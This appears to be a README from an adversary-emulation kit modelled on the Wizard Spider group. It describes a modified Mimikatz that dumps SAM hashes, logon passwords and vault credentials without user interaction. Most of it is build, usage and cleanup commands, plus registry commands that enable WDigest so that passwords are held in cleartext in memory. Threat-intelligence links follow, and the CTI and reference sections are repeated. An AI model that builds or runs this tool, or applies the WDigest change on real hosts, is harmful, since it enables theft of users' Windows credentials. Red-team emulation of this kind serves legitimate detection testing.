# Mimikatz

A variant of Mimikatz that executes lsadump::sam, sekurlsa::logonpasswords, and vault::list *without* user interaction. 

### Build Instructions

Open the command prompt (cmd.exe), navigate to directory containing the Mimikatz Visual Studio solution file (mimikatz.sln), and run the devenv.exe command:

	cd wizard_spider\Resources\Mimikatz
	"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\devenv.exe" mimikatz.sln /build Release

The executable will be found in the x64 folder.

### Test Instructions
Open PowerShell

	cd wizard_spider\Resources\Mimikatz\mimikatz
	mimikatz_test.ps1

### Usage Examples

	# execute all (lsadump::sam, sekurlsa::logonpasswords, and vault::list)
	mimikatz.exe
	
	# execute lsadump::sam
	mimikatz.exe s
	
	# execute sekurlsa::logonpasswords
	mimikatz.exe l
	
	# execute vault::list
	mimikatz.exe v


### Cleanup Instructions
Open a command prompt or PowerShell

	del mimikatz.exe
	
### Misc
To force credentials to be stored in cleartext in memory, Wizard Spider enables WDigest by modifying the registry (must be done as admin): 

	reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
	or
	(PowerShell) Set-ItemProperty -Path "HKLM:SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
	
For the changes to take effect, you must log out and log back in or restart the host.

Verify the change with: 

	reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
	or
	(PowerShell) Get-ItemProperty -Path "HKLM:SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"

Challenges:
- Need credentials to log back in, or voice track that the victim logs back in.

### CTI Evidence
https://attack.mitre.org/groups/G0102/
https://www.hhs.gov/sites/default/files/trickbot.pdf
https://us-cert.cisa.gov/ncas/alerts/aa20-302a
https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

### References
https://github.com/gentilkiwi/mimikatz  
https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019  

### CTI Evidence
https://attack.mitre.org/groups/G0102/  
https://www.hhs.gov/sites/default/files/trickbot.pdf  
https://us-cert.cisa.gov/ncas/alerts/aa20-302a  
https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html


### References
https://github.com/gentilkiwi/mimikatz  
https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019
